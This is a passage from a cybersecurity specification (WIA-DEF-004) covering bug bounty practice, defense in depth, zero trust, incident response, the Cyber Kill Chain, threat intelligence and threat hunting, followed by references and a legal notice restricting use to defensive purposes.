Platform Selection:
- HackerOne, Bugcrowd, Synack
- Vendor-hosted programs

Scope Understanding:
- In-scope assets
- Out-of-scope restrictions
- Prohibited testing methods

Responsible Testing:
- Avoid excessive traffic
- Don't access user data
- Stop upon finding vulnerability
- Document steps carefully

Reward Expectations:
- Critical: $1,000 - $50,000+
- High: $500 - $10,000
- Medium: $100 - $1,000
- Low: Recognition / Swag
```

---

## 10. Defense Strategies

### 10.1 Defense in Depth

#### 10.1.1 Layered Security Model

Seven Layers:
```
Layer 1: Physical Security
- Data center access controls
- Hardware security modules (HSM)
- Secure disposal procedures

Layer 2: Network Security
- Firewalls (stateful, next-gen)
- IDS/IPS (Snort, Suricata)
- Network segmentation (VLANs)
- VPN (IPsec, WireGuard)

Layer 3: Endpoint Security
- Antivirus/EDR (CrowdStrike, SentinelOne)
- Host-based firewalls
- Application whitelisting
- Disk encryption (BitLocker, LUKS)

Layer 4: Application Security
- Secure coding practices (OWASP)
- Input validation
- Output encoding
- Security testing (SAST, DAST)

Layer 5: Data Security
- Encryption at rest (AES-256)
- Encryption in transit (TLS 1.3)
- Data classification
- DLP (Data Loss Prevention)

Layer 6: Identity & Access
- MFA (multi-factor authentication)
- SSO (single sign-on)
- PAM (privileged access management)
- Zero trust architecture

Layer 7: Policies & Procedures
- Security policies
- Incident response plans
- Business continuity plans
- Security awareness training
```

#### 10.1.2 Zero Trust Architecture

Principles:
```
Never Trust, Always Verify:
- Verify every access request
- Assume breach
- Least privilege access
- Micro-segmentation

Implementation:
1. Identity Verification:
   - Strong authentication (MFA)
   - Continuous verification
   - Device trust assessment

2. Device Security:
   - Endpoint compliance checking
   - Health attestation
   - Managed/unmanaged device policies

3. Network Segmentation:
   - Software-defined perimeters
   - Micro-segmentation
   - East-west traffic inspection

4. Data Protection:
   - Classification and labeling
   - Encryption everywhere
   - DLP controls

5. Monitoring & Analytics:
   - SIEM integration
   - UEBA (User and Entity Behavior Analytics)
   - Threat intelligence feeds
```

### 10.2 Incident Response

#### 10.2.1 NIST Incident Response Lifecycle

Four Phases:
```
Phase 1: Preparation
- Incident response team formation
- Tools and resources
- Communication plans
- Training and exercises

Phase 2: Detection & Analysis
- Event monitoring
- Alert triage
- Incident classification
- Initial analysis

Phase 3: Containment, Eradication & Recovery
- Short-term containment (isolate systems)
- Long-term containment (temporary fixes)
- Eradication (remove threat)
- Recovery (restore operations)

Phase 4: Post-Incident Activity
- Lessons learned meeting
- Incident documentation
- Process improvement
- Threat intelligence sharing
```

#### 10.2.2 Cyber Kill Chain

Lockheed Martin Model:
```
1. Reconnaissance
   Detection: Log analysis, threat intelligence
   Mitigation: Minimize public exposure

2. Weaponization
   Detection: Threat intelligence, malware analysis
   Mitigation: Antivirus, email filtering

3. Delivery
   Detection: Email filtering, network monitoring
   Mitigation: Email security, web filtering

4. Exploitation
   Detection: IDS/IPS, endpoint protection
   Mitigation: Patching, hardening

5. Installation
   Detection: EDR, file integrity monitoring
   Mitigation: Application whitelisting

6. Command & Control
   Detection: Network monitoring, DNS filtering
   Mitigation: Firewall rules, proxy filtering

7. Actions on Objectives
   Detection: DLP, behavioral analytics
   Mitigation: Rapid response, containment
```

### 10.3 Threat Intelligence

#### 10.3.1 Intelligence Lifecycle

Five Phases:
```
1. Planning & Direction:
   - Define intelligence requirements
   - Identify information sources
   - Prioritize collection

2. Collection:
   - Internal sources (logs, SIEM)
   - External sources (threat feeds, ISAC)
   - OSINT (open source intelligence)
   - Commercial feeds (Recorded Future, ThreatConnect)

3. Processing:
   - Normalization
   - Enrichment
   - Correlation
   - STIX/TAXII format

4. Analysis & Production:
   - Indicator analysis (IOCs)
   - TTP mapping (MITRE ATT&CK)
   - Threat actor profiling
   - Campaign tracking

5. Dissemination:
   - SIEM integration
   - Security tool feeds
   - Stakeholder reports
   - Information sharing (ISACs)
```

#### 10.3.2 Threat Hunting

Proactive Hunt Methodology:
```
Hypothesis-Driven:
1. Generate hypothesis (based on threat intelligence)
   "Attackers may use PowerShell for lateral movement"

2. Investigate:
   - Query logs for PowerShell execution
   - Analyze command-line arguments
   - Check for encoded commands

3. Uncover patterns:
   - Normal baseline vs anomalies
   - Time-based correlation
   - User/system profiling

4. Inform and enrich:
   - Update detection rules
   - Feed into analytics
   - Share intelligence

Tools:
- Elastic Stack (ELK)
- Splunk
- Microsoft Sentinel
- Velociraptor
- OSQuery
```

---

## 11. References

### 11.1 Standards & Frameworks

| Framework | Organization | Purpose |
|-----------|-------------|---------|
| MITRE ATT&CK | MITRE Corporation | Adversary tactics and techniques |
| NIST CSF | NIST | Cybersecurity framework |
| ISO 27001 | ISO | Information security management |
| CIS Controls | Center for Internet Security | Security best practices |
| OWASP Top 10 | OWASP | Web application security |
| SANS Top 25 | SANS Institute | Software security errors |

### 11.2 Legal Documents

1. **Geneva Conventions** (1949, Updated)
   - International humanitarian law
   - Application to cyber warfare

2. **Tallinn Manual 2.0** (2017)
   - International law applicable to cyber operations
   - NATO CCDCOE publication

3. **Budapest Convention** (2001)
   - Convention on Cybercrime
   - Council of Europe

4. **UN GGE Reports** (2013, 2015)
   - UN Group of Governmental Experts
   - Norms of state behavior in cyberspace

### 11.3 WIA Standards

Related Standards:
- WIA-DEF-001: Defense Infrastructure Standards
- WIA-DEF-002: Military Communication Protocols
- WIA-DEF-003: Electronic Warfare Systems
- WIA-SEC-001: Encryption and Security
- WIA-SEC-002: Authentication Systems
- WIA-OMNI-API: Universal Security API

### 11.4 Threat Intelligence Sources

Open Source:
- AlienVault OTX (Open Threat Exchange)
- MISP (Malware Information Sharing Platform)
- VirusTotal
- AbuseIPDB
- URLhaus

Commercial:
- Recorded Future
- Mandiant Threat Intelligence
- CrowdStrike Falcon Intelligence
- Palo Alto Networks Unit 42
- Microsoft Threat Intelligence

### 11.5 Key Publications

1. **"The Cuckoo's Egg"** - Clifford Stoll (1989)
   Early cyber espionage case study

2. **"Countdown to Zero Day"** - Kim Zetter (2014)
   Stuxnet analysis and attribution

3. **"Sandworm"** - Andy Greenberg (2019)
   Russian cyber warfare campaigns

4. **"This Is How They Tell Me the World Ends"** - Nicole Perlroth (2021)
   Zero-day market and cyber weapons proliferation

---

**弘益人間 (홍익인간) · Benefit All Humanity**

*WIA-DEF-004 Specification v1.0*
*© 2025 SmileStory Inc. / WIA*
*MIT License*

---

**IMPORTANT LEGAL NOTICE**

This specification is provided for **defensive cybersecurity purposes only**. All information contained herein is intended to:

1. Educate security professionals
2. Improve defensive capabilities
3. Promote responsible security practices
4. Support compliance with international law

**Prohibited Uses:**
- Unauthorized access to computer systems
- Development or distribution of malware
- Cyber attacks or offensive operations
- Any violation of applicable laws

Users must comply with all applicable local, national, and international laws including but not limited to:
- Computer Fraud and Abuse Act (CFAA) - United States
- Computer Misuse Act - United Kingdom
- Cybercrime Act - Australia
- Budapest Convention on Cybercrime
- Geneva Conventions (as applicable to cyber operations)
- Tallinn Manual guidelines

The authors and WIA disclaim all liability for misuse of this information. This standard is published under the MIT License for lawful defensive purposes only.